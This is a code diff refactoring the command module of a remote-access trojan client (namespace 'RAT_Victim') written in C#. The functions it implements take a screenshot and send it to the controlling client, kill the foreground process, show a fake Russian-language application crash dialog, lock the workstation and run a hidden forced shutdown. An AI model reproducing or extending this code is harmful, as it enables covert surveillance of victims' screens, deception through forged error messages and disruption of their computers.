@@ -1,52 +1,52 @@
 ﻿using System.Diagnostics;
+using System.Diagnostics.CodeAnalysis;
 using System.Drawing;
 using System.Text;
 using System.Windows.Forms;
 
-#pragma warning disable IDE0051 // Remove unused private members (used by reflection)
+#pragma warning disable IDE0051 // Remove unused private members
 
 namespace RAT_Victim
 {
-    static class Commands
+    [SuppressMessage("ReSharper", "UnusedMember.Local")]
+    internal static class Commands
     {
-        static ImageConverter converter = new ImageConverter();
+        private static readonly ImageConverter Converter = new ImageConverter();
 
-        static void CloseActiveWindow()
+        private static void CloseActiveWindow()
         {
-            var window = WinAPI.GetForegroundWindow();
-            WinAPI.GetWindowThreadProcessId(window, out var processId);
-            var process = WinAPI.OpenProcess(1, true, processId);
-            WinAPI.TerminateProcess(process, 0);
+            var window = PInvoke.GetForegroundWindow();
+            PInvoke.GetWindowThreadProcessId(window, out var processId);
+            var process = PInvoke.OpenProcess(1, true, processId);
+            PInvoke.TerminateProcess(process, 0);
         }
 
-        static void ShowMessageBox()
+        private static void ShowMessageBox()
         {
-            var window = WinAPI.GetForegroundWindow();
-            StringBuilder builder = new StringBuilder();
-            WinAPI.GetWindowText(window, builder, builder.MaxCapacity);
-            WinAPI.MessageBox(window,
+            var window = PInvoke.GetForegroundWindow();
+            PInvoke.MessageBox(window,
                 "Ошибка при запуске приложения (0xc0000005). Для выхода из приложения нажмите кнопку \"OK\".",
-                builder + " - Ошибка приложения", 0x10);
+                GetActiveWindowTitle() + " - Ошибка приложения", 0x10);
         }
 
-        static void TakeScreenshot()
+        private static void TakeScreenshot()
         {
-            Size screenSize = Screen.PrimaryScreen.Bounds.Size;
-            Bitmap bitmap = new Bitmap(screenSize.Width, screenSize.Height);
-            Graphics graphics = Graphics.FromImage(bitmap);
+            var screenSize = Screen.PrimaryScreen.Bounds.Size;
+            var bitmap = new Bitmap(screenSize.Width, screenSize.Height);
+            var graphics = Graphics.FromImage(bitmap);
             graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
-            byte[] data = (byte[])converter.ConvertTo(bitmap, typeof(byte[]));
-            Program.client.Send(data);
+            var data = (byte[])Converter.ConvertTo(bitmap, typeof(byte[]));
+            if (data != null) Program.Client.Send(data);
         }
 
-        static void Lock()
+        private static void Lock()
         {
-            WinAPI.LockWorkStation();
+            PInvoke.LockWorkStation();
         }
 
-        static void Shutdown()
+        private static void Shutdown()
         {
-            Process process = new Process
+            var process = new Process
             {
                 StartInfo = new ProcessStartInfo("cmd", "/C shutdown /s /t 0")
                 { WindowStyle = ProcessWindowStyle.Hidden }
@@ -54,17 +54,17 @@ namespace RAT_Victim
             process.Start();
         }
 
-        public static string GetActiveWindowTitle()
+        private static string GetActiveWindowTitle()
         {
-            var window = WinAPI.GetForegroundWindow();
-            StringBuilder builder = new StringBuilder();
-            WinAPI.GetWindowText(window, builder, builder.MaxCapacity);
+            var window = PInvoke.GetForegroundWindow();
+            var builder = new StringBuilder();
+            PInvoke.GetWindowText(window, builder, builder.MaxCapacity);
             return builder.ToString();
         }
 
         public static void ShowMessage(string message)
         {
-            WinAPI.MessageBox(WinAPI.GetForegroundWindow(), message, GetActiveWindowTitle(), 0x40);
+            PInvoke.MessageBox(PInvoke.GetForegroundWindow(), message, GetActiveWindowTitle(), 0x40);
         }
     }
 }
